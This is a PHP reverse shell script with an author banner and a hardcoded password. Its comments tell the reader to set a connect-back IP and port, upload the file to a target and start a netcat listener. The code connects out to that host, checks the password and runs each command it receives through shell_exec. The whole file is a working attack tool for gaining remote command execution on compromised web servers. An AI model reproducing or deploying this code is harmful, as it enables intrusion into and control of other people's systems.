<?php
ini_set('max_execution_time',0);

##############################
# PHP Reverse Shell                     
# Edited BY: N-Cen-Dainamix               
# Facebook: htpp://facebook.com/ncendainamix
# Password shell: Dainamix  
# Edit ip and port for connect back and upload shell to target
# now run netcat wait for connect back 
# Command: nc -lvvp [port]
# Sample: nc -lvvp 4444
##############################

##### Edit Here #####
$ip = "127.0.0.1"; 
$port = 4444;      
##### Edit Here #####

$banner = ("
#####
# PHP Reverse Shell
# Edited BY: N-Cen-Dainamix
# Shell on program: phpMyAdmin Encoder Exploit
#####
(C) 2016 BY: `Dainamix~Team` \n
");
$password = ("Dainamix"); # password Dainamix
$read = 1337;
$sockfd = fsockopen($ip , $port , $errno, $errstr );
if($errno != 0)
  {
    print "\n****** Error Occured ******\nError Nnumber: $errno\nError String: $errstr\n\n";
    die(0);
  }
else if (!$sockfd)
  {
    print "Fatal : An unexpected error was occured when trying to connect!\n";
  }
else
  {
    print "Connecting to: $ip:$port\n\n";
    fputs ($sockfd , $banner);
    fputs($sockfd ,"Password: ");
    $getpass = trim(fgets($sockfd, strlen($password) + 2));

    if ($getpass == $password)
    {
      fputs($sockfd, "\nConnecting Shell Successfull..\n");
      while(!feof($sockfd))
      {
    $cmdPrompt = "Shell@" . trim($ip) . ":~# ";
    fputs ($sockfd , $cmdPrompt );
    $command = trim(fgets($sockfd, $read));
        if (trim($command) == "exit")
    {
      fputs($sockfd ,"\nExit.." );
      fclose($sockfd);
      die(0);
    }
    fputs($sockfd , "\n" . shell_exec($command) . "\n");
      }
      fclose($sockfd);
      die(0);
    }
    else
    {
      fputs($sockfd ,"\nCan't not login!!\n");
      fclose($sockfd);
      die(0);
    }
  }
?>
